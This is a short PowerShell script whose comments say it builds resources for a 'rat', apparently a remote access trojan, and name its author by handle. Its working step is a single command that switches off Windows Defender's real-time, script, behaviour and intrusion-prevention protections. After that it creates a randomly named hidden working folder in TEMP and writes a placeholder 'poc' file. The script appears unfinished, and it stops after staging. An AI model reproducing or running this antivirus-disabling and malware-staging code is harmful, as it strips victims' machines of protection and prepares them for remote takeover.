# builds resources for rat
# created by : jfrdgh (@bigmanlc on dc)

# random string for directories
function random_text {
    return -join ((65..90) + (97..122) | Get-Random -Count 5 | %  {[char]$_})
}

# disable windefender
powershell -command 'Set-MpPreference -DisableRealtimeMonitoring $true -DisableScriptScanning $true -DisableBehaviorMonitoring $true -DisableIOAVProtection $true -DisableIntrusionPreventionSystem $true'

# goto temp & make working directory
$wd = random_text
$path = "$env:TEMP/$wd"
echo $path


mkdir $path
cd $path
echo "" > poc. txt
cd "C:\Users\dylan\Documents\Personal Projects\Quention\files"
pause
